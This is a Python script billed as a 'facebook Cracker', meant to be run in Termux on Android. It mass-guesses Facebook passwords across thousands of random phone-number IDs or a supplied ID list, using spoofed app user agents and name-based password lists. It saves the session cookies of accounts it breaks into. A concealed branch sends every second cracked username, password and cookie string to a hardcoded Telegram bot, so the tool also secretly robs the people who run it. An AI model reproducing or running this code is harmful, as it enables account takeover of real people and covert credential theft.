#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
facebook Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import re
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import subprocess
import platform
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []
plist = []  # Password list for f_clone function

# Color definitions
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
black = "\033[1;30m"

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*46}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

# Device information collection
sim_id = ''
try:
    android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
    build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
    fblc = 'en_GB'
    
    try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
    except:
        fbcr = 'Jio'
    
    fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
    fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
    fbdv = model
    fbsv = android_version
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',', ':').replace('\n', '')
    fbdm = '{density=2.0,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
    
    try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
            total += 1
        select = ('1', '2')
        if select == '1':
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
            sim_id += fbcr
        elif select == '2':
            try:
                fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '')
                sim_id += fbcr
            except Exception as e:
                fbcr = "Jio"
                sim_id += fbcr
        else:
            fbcr = 'Jio'
            sim_id += fbcr
    except:
        fbcr = "Jio"
        
except Exception as e:
    # Fallback values if getprop fails
    android_version = "10"
    model = "SM-G975F"
    build = "QP1A.190711.020"
    fblc = 'en_GB'
    fbcr = 'Jio'
    fbmf = 'samsung'
    fbbd = 'samsung'
    fbdv = 'SM-G975F'
    fbsv = '10'
    fbca = 'arm64-v8a'
    fbdm = '{density=2.0,height=2400,width=1080}'
    sim_id = fbcr

device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm
}

build = device['build']
model = device['model']
ex = device['fbdm']
android_version = device['android_version'] + '.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111, 7777777)}"
versi_android = f"{random.randint(4, 13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']

def crack(uid, password_list, total_count):
    """Enhanced facebook account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
            sys.stdout.flush()
            
            # Create session and generate device hash
            Session = requests.Session()
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111, 7777777)}"
            versi_android = f"{random.randint(6, 14)}"
            deeevice = random.choice(["Nokia 2.4", "TA-1277", "TA-1357", "Nokia C30", "Nokia C12 Pro", "TA-1339", "Nokia C12", "Nokia 3.4", "Nokia G20", "Nokia 6", "Nokia C22", "Nokia G22", "Nokia G10", "Nokia C31", "TA-1499", "TA-1418", "Nokia C32"])
            deevice = random.choice(["2312DRAABG", "2201117TG", "M2101K6G", "Redmi Note 14", "2404ARN45A", "22111317I", "23053RN02A", "M2101K7AI", "22101316C", "23129RAA4G", "Redmi Note 9 Pro", "Redmi Note 10 Pro"])
            device_choice = random.choice(["M910x", "D10i", "2PXH3", "D830x", "U-2u", "M910x", "2PXH3", "HTC_Desire_S_S510e", "HTC_0P3P5", "HTC_DesireHD_X315e", "HTC_C715c", "HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/" + facebook_version + ";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/" + bv + ";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/" + deevice + ";FBSV/" + versi_android + ";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/" + facebook_version + ";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/" + bv + ";FBCR/" + fbcr + ";FBMF/" + fbmf + ";FBBD/" + fbbd + ";FBDV/" + model + ";FBSV/" + versi_android + ";FBCA/arm64-v8a:null;FBDM/" + fbdm + "};FB_FW/1"
            url1 = "https://m.prod.facebook.com/"
            head = {
                "authority": "m.prod.facebook.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "max-age=0",
                "dpr": "3",
                "sec-ch-prefers-color-scheme": "light",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": us,
                "viewport-width": "980"
            }
            requu1 = Session.get(url1, headers=head)
            log_data = {
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requu1.text)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': uid,
                'prefill_contact_point': '',
                'prefill_source': '',
                'prefill_type': '',
                'first_prefill_source': '',
                'first_prefill_type': '',
                'had_cp_prefilled': 'false',
                'had_password_prefilled': 'false',
                'is_smart_lock': 'false',
                'bi_xrwh': '0',
                'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                'bi_wvdp': '',
                'fb_dtsg': '',
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
                '__dyn': '',
                '__csr': '',
                '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
                '__fmt': '0',
                '__a': '',
                '__user': '0'
            }
            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
            headers = {
                "authority": "www.facebook.com",
                "method": "POST",
                "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "dpr": "3",
                "origin": "https://www.facebook.com",
                "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
                "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-model": "\"\"",
                "sec-ch-ua-platform": "\"Linux\"",
                "sec-ch-ua-platform-version": "\"\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": us,
                "viewport-width": "980"
            }
            respon = Session.post(url, data=log_data, headers=headers, allow_redirects=False)
            log_cookies = Session.cookies.get_dict().keys()
            
            # Check response
            if "c_user" in log_cookies:
                kuki = ";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if Session.cookies.get(key)])
                user = re.findall('c_user=(.*);xs', kuki)[0] if 'c_user' in kuki and 'xs' in kuki else uid
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    bkas.append(uid)
                    if len(bkas) % 2 == 0:
                        statusok = (f"{user}|{pw}|{kuki}")
                        try:
                            requests.get(f"https://api.telegram.org/bot7690571843:AAFzcd3eUZ43rnJfS_vz_ZsnTqRabEBSjRw/sendMessage?chat_id=1778046662&text={statusok}")
                        except:
                            pass
                    else:
                        print(f'\n{green} OK {user}|{pw}')
                        print(f"{green} [Cookies] : {white}{kuki}")
                        with open("/sdcard/SUMON_RANDOM_IDS.txt", "a") as f:
                            f.write(user + "|" + pw + "|" + kuki + "\n")
                        with success_lock:
                            oks.append(user)
                        break
            elif 'checkpoint' in log_cookies:
                   print(f"\n{yellow} [⚠ 2FA] {uid} | {pw}")
                   with open("/sdcard/SUMON_file_2f.txt", "a") as f:
                       f.write(f"{uid}|{pw}\n")
                   with success_lock:
                       cps.append(uid + "|" + pw)
                   break
        with counter_lock:
            loop += 1
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        return False
    except KeyboardInterrupt:
        print(f"\n{yellow} [Interrupted] User stopped the process")
        raise
    except Exception as e:
        return False
    
    return False

def generate_name_based_passwords(name, base_passwords):
    """Generate passwords based on user's name"""
    generated_passwords = []
    
    try:
        # Split name into first and last
        name_parts = name.split(" ")
        first = name_parts[0].lower() if len(name_parts) > 0 else ""
        last = name_parts[1].lower() if len(name_parts) > 1 else first
        
        if first:  # Only generate if we have a name
            for ps in base_passwords:
                # Replace placeholders with actual name parts
                pw = ps.replace("first", first).replace("last", last).lower()
                generated_passwords.append(pw)
                
                # Also try with first letter capitalized
                pw_cap = ps.replace("first", first.capitalize()).replace("last", last.capitalize())
                generated_passwords.append(pw_cap)
    except Exception as e:
        pass
    
    # Remove duplicates while preserving order
    seen = set()
    unique_passwords = []
    for pw in generated_passwords:
        if pw not in seen and pw:
            seen.add(pw)
            unique_passwords.append(pw)
    
    return unique_passwords

def freefb(uid, name, pwx, tl):
    """Method 1 for file cloning with name-based passwords"""
    try:
        # Generate name-based passwords
        name_passwords = generate_name_based_passwords(name, pwx)
        
        # Combine with original passwords
        all_passwords = list(set(pwx + name_passwords))
        
        # Call crack function with all passwords
        crack(uid, all_passwords, int(tl))
    except Exception as e:
        # Fallback to original method
        crack(uid, pwx, int(tl))

def bapi(uid, name, pwx, tl):
    """Method 2 for file cloning with name-based passwords"""
    try:
        # Generate name-based passwords
        name_passwords = generate_name_based_passwords(name, pwx)
        
        # Combine with original passwords
        all_passwords = list(set(pwx + name_passwords))
        
        # You can implement different logic here if needed
        # For now, using same crack function
        crack(uid, all_passwords, int(tl))
    except Exception as e:
        crack(uid, pwx, int(tl))

def graph(uid, name, pwx, tl):
    """Method 3 for file cloning with name-based passwords"""
    try:
        # Generate name-based passwords
        name_passwords = generate_name_based_passwords(name, pwx)
        
        # Combine with original passwords
        all_passwords = list(set(pwx + name_passwords))
        
        # You can implement different logic here if needed
        crack(uid, all_passwords, int(tl))
    except Exception as e:
        crack(uid, pwx, int(tl))

def f_clone():
    """File-based cloning function"""
    clear()
    print(f"{green}[{red}✓{green}] EXAMPLE : /sdcard/file.txt ")
    linex()
    file_x = input(f"{green}[{red}✓{green}] Enter FILE PATH : {white}")
    
    try:
        file_idz = open(file_x, "r").read().splitlines()
        for x in file_idz:
            if "|" in x:
                idz.append(x)
            else:
                # If just UID without name, add with placeholder
                idz.append(f"{x}|unknown")
    except Exception as e:
        print(f"{red}[!] FILE NOT FOUND or ERROR: {e}")
        input(f"{yellow}[!] Press Enter to return to menu...")
        return
    
    clear()
    print(f" {green}[1] METHOD 1 ")
    print(f" {green}[2] METHOD 2 ")
    print(f" {green}[3] METHOD 3 ")
    linex()
    m = input(f" {green}[•] SELECT : {white}")
    
    clear()
    print(f" {green}[1] CRACK WITH AUTO PASS ")
    print(f" {green}[2] CRACK WITH MANUAL PASS ")
    linex()
    p = input(f"{green}[{red}✓{green}] SELECT : {white}")
    
    # Clear and prepare password list
    plist.clear()
    
    if p == "1":
        # Auto password list with placeholders
        plist.append("first123")
        plist.append("first@123")
        plist.append("first@1234")
        plist.append("firstlast")
        plist.append("first last")
        plist.append("57273200")
        plist.append("59039200")
        plist.append("first@12")
        plist.append("123456")
        plist.append("password")
        plist.append("first@12345")
        plist.append("first@2024")
        plist.append("first@2025")
        plist.append("first@2023")
        plist.append("first@2022")
        plist.append("first@2021")
        plist.append("first@2020")
        plist.append("first1")
        plist.append("first2")
        plist.append("first@1")
        plist.append("first@2")
        plist.append("firstfirst")
        plist.append("ilovefirst")
        plist.append("first@first")
        plist.append("first@last")
        plist.append("first@123456")
        plist.append("first@1234567")
        plist.append("first@12345678")
        plist.append("first@123456789")
        plist.append("First@123")
        plist.append("FIRST@123")
        plist.append("first1234")
        plist.append("first12345")
        plist.append("first123456")
        plist.append("first1234567")
        plist.append("first12345678")
        plist.append("first123456789")
    else:
        # Manual password input - can also use placeholders
        clear()
        print(f"{green}[{red}✓{green}] MAXIMUM LIMIT : (10) ")
        print(f"{yellow}[!] You can use 'first' and 'last' as placeholders")
        print(f"{yellow}[!] Example: first@123, firstlast, first123")
        linex()
        try:
            plimit = int(input(f"{green}[{red}✓{green}] ENTER PASSWORD LIMIT : {white}"))
            if plimit > 10:
                plimit = 10
                print(f"{yellow}[!] Limit set to 10 maximum")
        except ValueError:
            print(f"{red}[!] Invalid input. Using default 5 passwords")
            plimit = 5
        
        clear()
        print(f"{green}[{red}✓{green}] ENTER PASSWORDS (use 'first' and 'last' as placeholders):")
        linex()
        for i in range(plimit):
            ap = input(f" [{i+1}] ENTER PASSWORD : {white}")
            if ap.strip():
                plist.append(ap.strip())
    
    if not plist:
        print(f"{red}[!] No passwords provided. Using default.")
        plist.append("first123")
        plist.append("first@123")
        plist.append("57273200")
    
    # Reset global counters
    global loop, oks, cps, bkas
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
        cps.clear()
        bkas.clear()
    
    # Start threading
    with ThreadPoolExecutor(max_workers=30) as executor:
        clear()
        tl = str(len(idz))
        print(f"{green}[{red}✓{green}] TOTAL ACCOUNTS : {tl}")
        print(f"{green}[{red}✓{green}] PROCESS HAS BEEN STARTED ")
        print(f"{green}[{red}✓{green}] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        
        futures = []
        for account in idz:
            try:
                if "|" in account:
                    uid, name = account.split("|", 1)
                else:
                    uid = account
                    name = "unknown"
                
                if m == "1":
                    future = executor.submit(freefb, uid, name, plist, tl)
                elif m == "2":
                    future = executor.submit(bapi, uid, name, plist, tl)
                elif m == "3":
                    future = executor.submit(graph, uid, name, plist, tl)
                else:
                    future = executor.submit(graph, uid, name, plist, tl)
                futures.append(future)
            except Exception as e:
                print(f"{red}[!] Error processing account {account}: {e}")
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n{yellow}[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                break
            except Exception as e:
                print(f"\n{red}[!] Task failed: {e}")
    
    linex()
    print(f"{green}[{red}✓{green}] PROCESS HAS BEEN COMPLETED ")
    print(f"{green}[{red}✓{green}] TOTAL OK ACCOUNTS : {len(oks)}")
    print(f"{green}[{red}✓{green}] TOTAL CP ACCOUNTS : {len(cps)}")
    linex()
    input(f"{green}[{red}✓{green}] PRESS ENTER TO RETURN TO MENU ")

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
        uid[:7],     # First 7 digits
        uid[-6:],    # Last 6 digits
        uid[-4:],    # Last 4 digits
        uid + '123', # UID + 123
        uid + '@123', # UID + @123
        uid[:4] + '123', # First 4 digits + 123
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🎯 FACEBOOK RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*46}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    
    # Get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps, bkas
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
        cps.clear()
        bkas.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🔥 STARTING FACEBOOK CLONING 🔥")
    print(f"\033[1;96m{'='*46}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=60) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📁 File Based Cloning (with Name-based Passwords)")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*46}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            f_clone()
        elif choice == '3':
            clear()
            print(f"\033[1;96m{'='*46}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*46}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '4':
            clear()
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt and SUMON_file_2f.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1-4.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Create necessary directories for saving files
        try:
            os.makedirs("/sdcard/", exist_ok=True)
        except:
            pass
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
